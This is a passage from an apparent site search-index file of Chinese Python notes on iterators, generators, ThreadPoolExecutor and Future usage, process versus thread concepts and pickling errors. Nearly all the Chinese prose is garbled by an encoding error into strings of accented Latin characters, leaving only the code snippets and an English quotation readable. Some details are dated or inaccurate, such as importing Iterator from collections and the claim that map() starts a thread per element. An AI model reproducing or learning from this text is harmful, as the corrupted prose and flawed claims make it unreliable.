ä¸ºè¿­ä»£å™¨å‰æå¿…é¡»æ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œæ‰€ä»¥åªå®ç° iter () æ–¹æ³•ä¸ä¸€å®šæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ã€‚ åœ¨ç±»é‡Œé¢å®šä¹‰ __iter__å’Œ __next__æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨è¯¥ç±»åˆ›å»ºçš„å¯¹è±¡å°±æ˜¯è¿­ä»£å™¨ (è¿­ä»£å™¨ä¹Ÿå±äºå¯è¿­ä»£å¯¹è±¡) åˆ¤æ–­: from collections import Iterator, Iterable result = isinstance((3, 5), Iterator) print(\"æ˜¯å¦æ˜¯è¿­ä»£å™¨:\", result) result = isinstance((3, 5), Iterable) print(\"æ˜¯å¦æ˜¯å¯è¿­ä»£å¯¹è±¡:\", result) ç”Ÿæˆå™¨ ä¹Ÿæ˜¯è¿­ä»£å™¨: A function which returns a generator iterator. It looks like a normal function except that it contains yield expressions for producing a series of values usable in a for-loop or that can be retrieved one at a time with the next() function. Usually refers to a generator function, but may refer to a generator iterator in some contexts. In cases where the intended meaning isn't clear, using the full terms avoids ambiguity. å®šä¹‰ï¼šä¸€è¾¹å¾ªåä¸€è¾¹è®¡ç®—çš„æœºåˆ¶ï¼ˆgeneratorï¼‰ å®ƒæ˜¯ä¸€ä¸ª è¿­ä»£å™¨ ï¼› å®ƒæ˜¯ä¸€ä¸ªå«æœ‰ç‰¹æ®Šå…³é”®å­— yield çš„ è¿­ä»£å™¨ ï¼› æ¯æ¬¡ç”Ÿæˆä¸€ä¸ªå€¼ï¼Œå¯é€šè¿‡ next() æ–¹æ³•è·å–ã€‚ åˆ›å»ºä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ï¼Œ æ–¹æ³•ä¸€ï¼šåªéœ€è¦å°†åˆ—è¡¨ç”Ÿæˆå¼çš„ [] æ¢æˆ () å³å¯: g = (x * x for x in range(10)) æ–¹æ³•äºŒï¼šå‡½æ•°ä½¿ç”¨ yield å…³é”®å­—ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°†æ˜¯ä¸€ä¸ª generator: def g(): a = {id:0 for id in range(10)} for k, v in a.items(): yield k, v åŸç†ï¼š ç”Ÿæˆå™¨(generator)èƒ½å¤Ÿè¿­ä»£çš„å…³é”®æ˜¯å®ƒæœ‰ä¸€ä¸ªnext()æ–¹æ³•ï¼Œ å·¥ä½œåŸç†å°±æ˜¯é€šè¿‡é‡å¤è°ƒç”¨next()æ–¹æ³•ï¼Œç›´åˆ°æ•è·ä¸€ä¸ªå¼‚å¸¸ã€‚ å¸¦æœ‰ yield çš„å‡½æ•°ä¸å†æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨generatorã€‚ å¯ç”¨next()è°ƒç”¨ç”Ÿæˆå™¨å¯¹è±¡æ¥å–å€¼ã€‚next ä¸¤ç§æ–¹å¼ t.__next__() | next(t)ã€‚ å¯ç”¨for å¾ªç¯è·å–è¿”å›å€¼ï¼ˆæ¯æ‰§è¡Œä¸€æ¬¡ï¼Œå–ç”Ÿæˆå™¨é‡Œé¢ä¸€ä¸ªå€¼ï¼‰ ï¼ˆåŸºæœ¬ä¸Šä¸ä¼šç”¨`next()`æ¥è·å–ä¸‹ä¸€ä¸ªè¿”å›å€¼ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨`for`å¾ªç¯æ¥è¿­ä»£ï¼‰ã€‚ yieldç›¸å½“äº return è¿”å›ä¸€ä¸ªå€¼ï¼Œå¹¶ä¸”è®°ä½è¿™ä¸ªè¿”å›çš„ä½ç½®ï¼Œä¸‹æ¬¡è¿­ä»£æ—¶ï¼Œä»£ç ä»yieldçš„ä¸‹ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œã€‚ send() å’Œnext()ä¸€æ ·ï¼Œéƒ½èƒ½è®©ç”Ÿæˆå™¨ç»§ç»­å¾€ä¸‹èµ°ä¸€æ­¥ï¼ˆä¸‹æ¬¡é‡åˆ°yieldåœï¼‰ï¼Œä½†send()èƒ½ä¼ ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼ä½œä¸ºyieldè¡¨è¾¾å¼æ•´ä½“çš„ç»“æœ â€”â€”æ¢å¥è¯è¯´ï¼Œå°±æ˜¯sendå¯ä»¥å¼ºè¡Œä¿®æ”¹ä¸Šä¸€ä¸ªyieldè¡¨è¾¾å¼å€¼ã€‚æ¯”å¦‚å‡½æ•°ä¸­æœ‰ä¸€ä¸ªyieldèµ‹å€¼ï¼Œa = yield 5ï¼Œç¬¬ä¸€æ¬¡è¿­ä»£åˆ°è¿™é‡Œä¼šè¿”å›ï¼ˆ5ï¼‰aè¿˜æ²¡æœ‰èµ‹å€¼ã€‚ç¬¬äºŒæ¬¡è¿­ä»£æ—¶ï¼Œä½¿ç”¨.send(10)ï¼Œé‚£ä¹ˆï¼Œå°±æ˜¯å¼ºè¡Œä¿®æ”¹yield 5è¡¨è¾¾å¼çš„å€¼ä¸º10ï¼Œæœ¬æ¥æ˜¯5çš„ï¼Œé‚£ä¹ˆa=10 æ€»ç»“ è¿­ä»£çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯é€šè¿‡ä¸‹æ ‡ï¼Œå³å®ç° getitem ï¼Œä¸€ç§æ˜¯ç›´æ¥è·å–å€¼ï¼Œ å³å®ç° iter ï¼Œä¸¤ç§æ–¹å¼éƒ½å¯é€šè¿‡ **forâ€¦in** æ–¹å¼è¿›è¡Œéå†ã€‚ä¹Ÿéƒ½æ˜¯å¯è¿­ä»£å¯¹è±¡ï¼› isinstance åˆ¤æ–­å¯è¿­ä»£å¯¹è±¡æ—¶ï¼Œé’ˆå¯¹ä¸‹æ ‡è®¿é—®çš„åˆ¤æ–­æœ‰å‡ºå…¥ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ï¼› å¯è¿­ä»£å¯¹è±¡åŸºæœ¬è¦æ±‚æ˜¯å¯éå†è·å–å€¼ï¼› åºåˆ—ä¸€å®šæ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œå®ƒå®ç°äº† **len()** å’Œ getitem ï¼Œå¯è·å–é•¿åº¦ï¼Œå¯é€šè¿‡ä¸‹æ ‡è®¿é—®ï¼› è¿­ä»£å™¨ä¸€å®šæ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œå®ƒå®ç°äº† next ()ï¼› ç”Ÿæˆå™¨æ˜¯ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒä¸€å®šæ˜¯è¿­ä»£å™¨ï¼Œå› æ­¤ä¹Ÿä¸€å®šæ˜¯å¯è¿­ä»£å¯¹è±¡ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Iterate.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Iterate.html"},{"title":"å¤šçº¿ç¨‹-çº¿ç¨‹æ± ","text":"å‚è€ƒ: Pythonçº¿ç¨‹æ± åŠå…¶åŸç†å’Œä½¿ç”¨ï¼ˆè¶…çº§è¯¦ç»†ï¼‰ ç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªæ–°çº¿ç¨‹çš„æˆæœ¬æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œå› ä¸ºå®ƒæ¶‰åŠä¸æ“ä½œç³»ç»Ÿçš„äº¤äº’ã€‚ åœ¨è¿™ç§æƒ…å½¢ä¸‹ï¼Œä½¿ç”¨çº¿ç¨‹æ± å¯ä»¥å¾ˆå¥½åœ°æå‡æ€§èƒ½ï¼Œ å°¤å…¶æ˜¯å½“ç¨‹åºä¸­éœ€è¦åˆ›å»ºå¤§é‡ç”Ÿå­˜æœŸå¾ˆçŸ­æš‚çš„çº¿ç¨‹æ—¶ï¼Œæ›´åº”è¯¥è€ƒè™‘ä½¿ç”¨çº¿ç¨‹æ± ã€‚ çº¿ç¨‹æ± åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å³åˆ›å»ºå¤§é‡ç©ºé—²çš„çº¿ç¨‹ï¼Œç¨‹åºåªè¦å°†ä¸€ä¸ªå‡½æ•°æäº¤ç»™çº¿ç¨‹æ± ï¼Œ çº¿ç¨‹æ± å°±ä¼šå¯åŠ¨ä¸€ä¸ªç©ºé—²çš„çº¿ç¨‹æ¥æ‰§è¡Œå®ƒã€‚ å½“è¯¥å‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¯¥çº¿ç¨‹å¹¶ä¸ä¼šæ­»äº¡ï¼Œè€Œæ˜¯å†æ¬¡è¿”å›åˆ°çº¿ç¨‹æ± ä¸­å˜æˆç©ºé—²çŠ¶æ€ï¼Œç­‰å¾…æ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°ã€‚ æ­¤å¤–ï¼Œä½¿ç”¨çº¿ç¨‹æ± å¯ä»¥æœ‰æ•ˆåœ°æ§åˆ¶ç³»ç»Ÿä¸­å¹¶å‘çº¿ç¨‹çš„æ•°é‡ã€‚ å½“ç³»ç»Ÿä¸­åŒ…å«æœ‰å¤§é‡çš„å¹¶å‘çº¿ç¨‹æ—¶ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿæ€§èƒ½æ€¥å‰§ä¸‹é™ï¼Œ ç”šè‡³å¯¼è‡´ Python è§£é‡Šå™¨å´©æºƒï¼Œè€Œçº¿ç¨‹æ± çš„æœ€å¤§çº¿ç¨‹æ•°å‚æ•°å¯ä»¥æ§åˆ¶ç³»ç»Ÿä¸­å¹¶å‘çº¿ç¨‹çš„æ•°é‡ä¸è¶…è¿‡æ­¤æ•°ã€‚ çº¿ç¨‹æ± çš„ä½¿ç”¨ çº¿ç¨‹æ± çš„åŸºç±»æ˜¯ concurrent.futures æ¨¡å—ä¸­çš„ Executor , Executor æä¾›äº†ä¸¤ä¸ªå­ç±»ï¼Œ å³ ThreadPoolExecutor å’Œ ProcessPoolExecutorï¼Œ å…¶ä¸­ ThreadPoolExecutor ç”¨äºåˆ›å»ºçº¿ç¨‹æ± ï¼Œè€Œ ProcessPoolExecutor ç”¨äºåˆ›å»ºè¿›ç¨‹æ± . è¯¦ç»†å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/concurrent å¦‚æœä½¿ç”¨çº¿ç¨‹æ± /è¿›ç¨‹æ± æ¥ç®¡ç†å¹¶å‘ç¼–ç¨‹ï¼Œ é‚£ä¹ˆåªè¦å°†ç›¸åº”çš„ task å‡½æ•°æäº¤ç»™çº¿ç¨‹æ± /è¿›ç¨‹æ± ï¼Œå‰©ä¸‹çš„äº‹æƒ…å°±ç”±çº¿ç¨‹æ± /è¿›ç¨‹æ± æ¥æå®šã€‚ Exectuoræä¾›çš„å¸¸ç”¨æ–¹æ³•: submit(fn, *args, **kwargs)ï¼š å°† fn å‡½æ•°æäº¤ç»™çº¿ç¨‹æ± ã€‚*args ä»£è¡¨ä¼ ç»™ fn å‡½æ•°çš„å‚æ•°ï¼Œ*kwargs ä»£è¡¨ä»¥å…³é”®å­—å‚æ•°çš„å½¢å¼ä¸º fn å‡½æ•°ä¼ å…¥å‚æ•°ã€‚ map(func, *iterables, timeout=None, chunksize=1) è¯¥å‡½æ•°ç±»ä¼¼äºå…¨å±€å‡½æ•° map(func, *iterables)ï¼Œåªæ˜¯è¯¥å‡½æ•°å°†ä¼šå¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œä»¥å¼‚æ­¥æ–¹å¼ç«‹å³å¯¹ iterables æ‰§è¡Œ map å¤„ç†ã€‚ shutdown(wait=True) å…³é—­çº¿ç¨‹æ± ã€‚ è¯¦è§: concurrent-Executor-funs ç¨‹åºå°† task å‡½æ•°æäº¤ï¼ˆsubmitï¼‰ç»™çº¿ç¨‹æ± åï¼Œsubmit æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Future å¯¹è±¡ï¼Œ Future ç±»ä¸»è¦ç”¨äºè·å–çº¿ç¨‹ä»»åŠ¡å‡½æ•°çš„è¿”å›å€¼ã€‚ ç”±äºçº¿ç¨‹ä»»åŠ¡ä¼šåœ¨æ–°çº¿ç¨‹ä¸­ä»¥å¼‚æ­¥æ–¹å¼æ‰§è¡Œï¼Œ å› æ­¤ï¼Œçº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°ç›¸å½“äºä¸€ä¸ª\"å°†æ¥å®Œæˆ\"çš„ä»»åŠ¡ï¼Œæ‰€ä»¥ Python ä½¿ç”¨ Future æ¥ä»£è¡¨ã€‚ æ³¨è§£ å®é™…ä¸Šï¼Œåœ¨ Java çš„å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­åŒæ ·æœ‰ Futureï¼Œæ­¤å¤„çš„ Future ä¸ Java çš„ Future å¤§åŒå°å¼‚ã€‚ Future æä¾›äº†çš„æ–¹æ³•(è¯¦è§: concurrent-Future ) cancel()ï¼šå–æ¶ˆè¯¥ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡ã€‚å¦‚æœè¯¥ä»»åŠ¡æ­£åœ¨æ‰§è¡Œï¼Œä¸å¯å–æ¶ˆï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› Falseï¼›å¦åˆ™ï¼Œç¨‹åºä¼šå–æ¶ˆè¯¥ä»»åŠ¡ï¼Œå¹¶è¿”å› Trueã€‚ cancelled()ï¼šè¿”å› Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡æ˜¯å¦è¢«æˆåŠŸå–æ¶ˆã€‚ running()ï¼šå¦‚æœè¯¥ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡æ­£åœ¨æ‰§è¡Œã€ä¸å¯è¢«å–æ¶ˆï¼Œè¯¥æ–¹æ³•è¿”å› Trueã€‚ done()ï¼šå¦‚æœè¯¥ Funture ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡è¢«æˆåŠŸå–æ¶ˆæˆ–æ‰§è¡Œå®Œæˆï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› Trueã€‚ result(timeout=None)ï¼šè·å–è¯¥ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡æœ€åè¿”å›çš„ç»“æœã€‚å¦‚æœ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡è¿˜æœªå®Œæˆï¼Œè¯¥æ–¹æ³•å°†ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œå…¶ä¸­ timeout å‚æ•°æŒ‡å®šæœ€å¤šé˜»å¡å¤šå°‘ç§’ã€‚ exception(timeout=None)ï¼šè·å–è¯¥ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡æ‰€å¼•å‘çš„å¼‚å¸¸ã€‚å¦‚æœè¯¥ä»»åŠ¡æˆåŠŸå®Œæˆï¼Œæ²¡æœ‰å¼‚å¸¸ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› Noneã€‚ add_done_callback(fn)ï¼šä¸ºè¯¥ Future ä»£è¡¨çš„çº¿ç¨‹ä»»åŠ¡æ³¨å†Œä¸€ä¸ª\"å›è°ƒå‡½æ•°\"ï¼Œå½“è¯¥ä»»åŠ¡æˆåŠŸå®Œæˆæ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨è§¦å‘è¯¥ fn å‡½æ•°ã€‚ åœ¨ç”¨å®Œä¸€ä¸ªçº¿ç¨‹æ± åï¼Œåº”è¯¥è°ƒç”¨è¯¥çº¿ç¨‹æ± çš„ shutdown() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†å¯åŠ¨çº¿ç¨‹æ± çš„å…³é—­åºåˆ—ã€‚ è°ƒç”¨ shutdown() æ–¹æ³•åçš„çº¿ç¨‹æ± ä¸å†æ¥æ”¶æ–°ä»»åŠ¡ï¼Œä½†ä¼šå°†ä»¥å‰æ‰€æœ‰çš„å·²æäº¤ä»»åŠ¡æ‰§è¡Œå®Œæˆã€‚ å½“çº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰ä»»åŠ¡éƒ½æ‰§è¡Œå®Œæˆåï¼Œè¯¥çº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰çº¿ç¨‹éƒ½ä¼šæ­»äº¡ã€‚ ä½¿ç”¨çº¿ç¨‹æ± æ¥æ‰§è¡Œçº¿ç¨‹ä»»åŠ¡çš„æ­¥éª¤å¦‚ä¸‹: è°ƒç”¨ ThreadPoolExecutor ç±»çš„æ„é€ å™¨åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ã€‚ å®šä¹‰ä¸€ä¸ªæ™®é€šå‡½æ•°ä½œä¸ºçº¿ç¨‹ä»»åŠ¡ã€‚ è°ƒç”¨ ThreadPoolExecutor å¯¹è±¡çš„ submit() æ–¹æ³•æ¥æäº¤çº¿ç¨‹ä»»åŠ¡ã€‚ å½“ä¸æƒ³æäº¤ä»»ä½•ä»»åŠ¡æ—¶ï¼Œè°ƒç”¨ ThreadPoolExecutor å¯¹è±¡çš„ shutdown() æ–¹æ³•æ¥å…³é—­çº¿ç¨‹æ± ã€‚ æŠŠ action() å‡½æ•°æäº¤ç»™çº¿ç¨‹æ± æ—¶ï¼Œsubmit() æ–¹æ³•ä¼šè¿”å›è¯¥ä»»åŠ¡æ‰€å¯¹åº”çš„ Future å¯¹è±¡ï¼Œ ç¨‹åºç«‹å³åˆ¤æ–­ futurel çš„ done() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†ä¼šè¿”å› Falseï¼ˆè¡¨æ˜æ­¤æ—¶è¯¥ä»»åŠ¡è¿˜æœªå®Œæˆï¼‰ã€‚ æ¥ä¸‹æ¥ä¸»ç¨‹åºæš‚åœ 3 ç§’ï¼Œç„¶ååˆ¤æ–­ future2 çš„ done() æ–¹æ³•ï¼Œå¦‚æœæ­¤æ—¶è¯¥ä»»åŠ¡å·²ç»å®Œæˆï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•å°†ä¼šè¿”å› Trueã€‚ ç¨‹åºæœ€åé€šè¿‡ Future çš„ result() æ–¹æ³•æ¥è·å–ä¸¤ä¸ªå¼‚æ­¥ä»»åŠ¡è¿”å›çš„ç»“æœã€‚ å½“ç¨‹åºä½¿ç”¨ Future çš„ result() æ–¹æ³•æ¥è·å–ç»“æœæ—¶ï¼Œè¯¥æ–¹æ³•ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œ å¦‚æœæ²¡æœ‰æŒ‡å®š timeout å‚æ•°ï¼Œå½“å‰çº¿ç¨‹å°†ä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ï¼Œç›´åˆ° Future ä»£è¡¨çš„ä»»åŠ¡è¿”å›: from concurrent.futures import ThreadPoolExecutor import threading import time # å®šä¹‰ä¸€ä¸ªå‡†å¤‡ä½œä¸ºçº¿ç¨‹ä»»åŠ¡çš„å‡½æ•° def action(max): my_sum = 0 for i in range(max): print(threading.current_thread().name + ' ' + str(i)) my_sum += i return my_sum # åˆ›å»ºä¸€ä¸ªåŒ…å«2æ¡çº¿ç¨‹çš„çº¿ç¨‹æ±  pool = ThreadPoolExecutor(max_workers=2) # å‘çº¿ç¨‹æ± æäº¤ä¸€ä¸ªtask, 50ä¼šä½œä¸ºaction()å‡½æ•°çš„å‚æ•° future1 = pool.submit(action, 50) # å‘çº¿ç¨‹æ± å†æäº¤ä¸€ä¸ªtask, 100ä¼šä½œä¸ºaction()å‡½æ•°çš„å‚æ•° future2 = pool.submit(action, 100) # åˆ¤æ–­future1ä»£è¡¨çš„ä»»åŠ¡æ˜¯å¦ç»“æŸ print(future1.done()) time.sleep(3) # åˆ¤æ–­future2ä»£è¡¨çš„ä»»åŠ¡æ˜¯å¦ç»“æŸ print(future2.done()) # æŸ¥çœ‹future1ä»£è¡¨çš„ä»»åŠ¡è¿”å›çš„ç»“æœ print(future1.result()) # æŸ¥çœ‹future2ä»£è¡¨çš„ä»»åŠ¡è¿”å›çš„ç»“æœ print(future2.result()) # å…³é—­çº¿ç¨‹æ±  pool.shutdown() è·å–æ‰§è¡Œç»“æœ è¿˜æ˜¯é  concurrent-Future è°ƒç”¨ Future çš„ result() æ–¹æ³•æ¥è·å–çº¿ç¨‹ä»»åŠ¡çš„è¿å›å€¼ï¼Œ ä½†è¯¥æ–¹æ³•ä¼šé˜»å¡å½“å‰ä¸»çº¿ç¨‹ï¼Œåªæœ‰ç­‰åˆ°é’±ç¨‹ä»»åŠ¡å®Œæˆåï¼Œresult() æ–¹æ³•çš„é˜»å¡æ‰ä¼šè¢«è§£é™¤ å¦‚æœç¨‹åºä¸å¸Œæœ›ç›´æ¥è°ƒç”¨ result() æ–¹æ³•é˜»å¡çº¿ç¨‹ï¼Œ åˆ™å¯é€šè¿‡ Future çš„ add_done_callback() æ–¹æ³•æ¥æ·»åŠ å›è°ƒå‡½æ•°ï¼Œ è¯¥å›è°ƒå‡½æ•°å½¢å¦‚ fn(future)ã€‚ å½“çº¿ç¨‹ä»»åŠ¡å®Œæˆåï¼Œç¨‹åºä¼šè‡ªåŠ¨è§¦å‘è¯¥å›è°ƒå‡½æ•°ï¼Œå¹¶å°†å¯¹åº”çš„ Future å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ ç»™è¯¥å›è°ƒå‡½æ•°: # å®šä¹‰ä¸€ä¸ªå‡†å¤‡ä½œä¸ºçº¿ç¨‹ä»»åŠ¡çš„å‡½æ•° def action(max): my_sum = 0 for i in range(max): print(threading.current_thread().name + ' ' + str(i)) my_sum += i return my_sum # åˆ›å»ºä¸€ä¸ªåŒ…å«2æ¡çº¿ç¨‹çš„çº¿ç¨‹æ±  with ThreadPoolExecutor(max_workers=2) as pool: # å‘çº¿ç¨‹æ± æäº¤ä¸€ä¸ªtask, 50ä¼šä½œä¸ºaction()å‡½æ•°çš„å‚æ•° future1 = pool.submit(action, 50) # å‘çº¿ç¨‹æ± å†æäº¤ä¸€ä¸ªtask, 100ä¼šä½œä¸ºaction()å‡½æ•°çš„å‚æ•° future2 = pool.submit(action, 100) def get_result(future): print(future.result()) # ä¸ºfuture1æ·»åŠ çº¿ç¨‹å®Œæˆçš„å›è°ƒå‡½æ•° future1.add_done_callback(get_result) # ä¸ºfuture2æ·»åŠ çº¿ç¨‹å®Œæˆçš„å›è°ƒå‡½æ•° future2.add_done_callback(get_result) print('--------------') ç”±äºçº¿ç¨‹æ± å®ç°äº† ä¸Šä¸‹æ–‡ç®¡ç†åè®®ï¼ˆContext Manage Protocolï¼‰ ï¼Œ å› æ­¤ï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨ with è¯­å¥æ¥ç®¡ç†çº¿ç¨‹æ± ï¼Œè¿™æ ·å³å¯é¿å…æ‰‹åŠ¨å…³é—­çº¿ç¨‹æ± ï¼Œå¦‚ä¸Šé¢çš„ç¨‹åºæ‰€ç¤ºã€‚ æ­¤å¤–ï¼ŒExectuor è¿˜æä¾›äº†ä¸€ä¸ª map(func, *iterables, timeout=None, chunksize=1) æ–¹æ³•ï¼Œ è¯¥æ–¹æ³•çš„åŠŸèƒ½ç±»ä¼¼äºå…¨å±€å‡½æ•° map()ï¼Œ åŒºåˆ«åœ¨äºçº¿ç¨‹æ± çš„ map() æ–¹æ³•ä¼šä¸º iterables çš„æ¯ä¸ªå…ƒç´ å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œ ä»¥å¹¶å‘æ–¹å¼æ¥æ‰§è¡Œ func å‡½æ•°ã€‚ è¿™ç§æ–¹å¼ç›¸å½“äºå¯åŠ¨ len(iterables) ä¸ªçº¿ç¨‹ï¼Œäº•æ”¶é›†æ¯ä¸ªçº¿ç¨‹çš„æ‰§è¡Œç»“æœ: # åˆ›å»ºä¸€ä¸ªåŒ…å«4æ¡çº¿ç¨‹çš„çº¿ç¨‹æ±  with ThreadPoolExecutor(max_workers=4) as pool: # ä½¿ç”¨çº¿ç¨‹æ‰§è¡Œmapè®¡ç®— # åé¢å…ƒç»„æœ‰3ä¸ªå…ƒç´ ï¼Œå› æ­¤ç¨‹åºå¯åŠ¨3æ¡çº¿ç¨‹æ¥æ‰§è¡Œactionå‡½æ•° results = pool.map(action, (50, 100, 150)) print('--------------') for r in results: print(r)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Multi-thread-thread-pool.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Multi-thread-thread-pool.html"},{"title":"Pythonä¸‹è¿›ç¨‹ä¸çº¿ç¨‹","text":"è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ« è¿›ç¨‹æ˜¯å¯¹è¿è¡Œæ—¶ç¨‹åºçš„å°è£…ï¼Œæ˜¯ç³»ç»Ÿèµ„æºè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ çº¿ç¨‹æ˜¯è¿›ç¨‹çš„å­ä»»åŠ¡ï¼Œcpuè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œå®ç°è¿›ç¨‹å†…å¹¶å‘ã€‚ ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹ä¾èµ–è¿›ç¨‹å­˜åœ¨ï¼Œå¹¶å…±äº«è¿›ç¨‹å†…å­˜ çº¿ç¨‹å®‰å…¨ ä¸€ä¸ªæ“ä½œå¯ä»¥åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”è·å¾—æ­£ç¡®çš„ç»“æœã€‚ çº¿ç¨‹å®‰å…¨çš„æ“ä½œçº¿ç¨‹æ˜¯é¡ºåºæ‰§è¡Œçš„è€Œä¸æ˜¯å¹¶å‘æ‰§è¡Œçš„ã€‚ ä¸€èˆ¬æ¶‰åŠåˆ°å†™æ“ä½œéœ€è¦è€ƒè™‘å¦‚ä½•è®©å¤šä¸ªçº¿ç¨‹å®‰å…¨è®¿é—®æ•°æ®ã€‚ çº¿ç¨‹é—´é€šä¿¡ äº’æ–¥é‡ï¼ˆé”ï¼‰: é€šè¿‡äº’æ–¥æœºåˆ¶é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…¬å…±èµ„æºã€‚ ä¿¡å·é‡ï¼ˆSemphareï¼‰: æ§åˆ¶åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªèµ„æºçš„çº¿ç¨‹æ•°ã€‚ ps: pythonçš„threading æ–‡æ¡£ äº‹ä»¶ï¼ˆä¿¡å·ï¼‰: é€šè¿‡é€šçŸ¥çš„æ–¹å¼ä¿æŒå¤šä¸ªçº¿ç¨‹çš„åŒæ­¥ã€‚ è¿›ç¨‹é—´é€šä¿¡ IPC: Inter-Process Communication è¿›ç¨‹é—´ä¼ é€’ä¿¡å·æˆ–è€…æ•°æ® ç®¡é“/åŒ¿åç®¡é“/æœ‰åç®¡é“ï¼ˆpipeï¼‰ ä¿¡å·ï¼ˆSignalï¼‰: æ¯”å¦‚ç”¨æˆ·ä½¿ç”¨ctrl+cäº§ç”ŸSIGINTç¨‹åºç»ˆæ­¢ä¿¡å· æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessageï¼‰ å…±äº«å†…å­˜ï¼ˆshare memoryï¼‰ è¿›ç¨‹é—´çš„ä¿¡å·é‡ï¼ˆSemaphoreï¼‰ å¥—æ¥å­—ï¼ˆsocketï¼‰: æœ€å¸¸ç”¨çš„æ–¹å¼ï¼Œæˆ‘ä»¬çš„webåº”ç”¨å°±æ˜¯è¿™ç§æ–¹å¼ è¯¦ç»†ä»‹ç» /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/å¤šçº¿ç¨‹ /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/å¤šè¿›ç¨‹ Can't pickle local object ä½¿ç”¨å¤šçº¿/è¿›ç¨‹æ—¶, ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨çš„ /docs/åç«¯/python/pythonæ ‡å‡†åº“/multiprocessing æ¨¡å—(æˆ–è€…å¤šçº¿ç¨‹çš„). å…¶å†…éƒ¨è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶, ä¼šå°†æ•°æ®åºåˆ—åŒ–å¤„ç†. å…¶å†…éƒ¨æºç ä½¿ç”¨çš„æ˜¯ pickle æ¨¡å—. ä½†æ˜¯è¿™ä¸ªæ¨¡å—åˆä¸èƒ½å¯¹å±€éƒ¨å‡½æ•°, lambda å‡½æ•°è¿›è¡Œåºåˆ—åŒ–, æ‰€ä»¥å®¹æ˜“äº§ç”Ÿè¿™æ ·çš„æŠ¥é”™: Can't pickle local object xxxx å¯ä»¥ä»ä¸¤ç§è§’åº¦æ¥è§£å†³: ç¼–ç æ—¶å€™ä¸ä½¿ç”¨ lambda å‡½æ•°/å±€éƒ¨å‡½æ•°(é—­åŒ…), è¿™ä¸ªæ­¤å¤„ä¸åšè¯´æ˜, æ›´æ–°ä¸€ä¸‹ç»“æ„å°±è¡Œäº† ä½¿ç”¨å…¶ä»–æ–¹å¼è¿›è¡Œæ•°æ®/å¯¹è±¡çš„åºåˆ—åŒ–, æˆ–è€…ç›´æ¥ä½¿ç”¨å…¶ä»–æ¨¡å— å…¶ä»–åºåˆ—åŒ–æ–¹å¼ dill dill å®‰è£…: pip install dill ä½¿ç”¨: import dill obj = SomeClass() data = dill.dumps(obj) obj = dill.loads(data) å…¶ä»–æ¨¡å— pathos.multiprocessing: from pathos.multiprocessing import ProcessingPool as 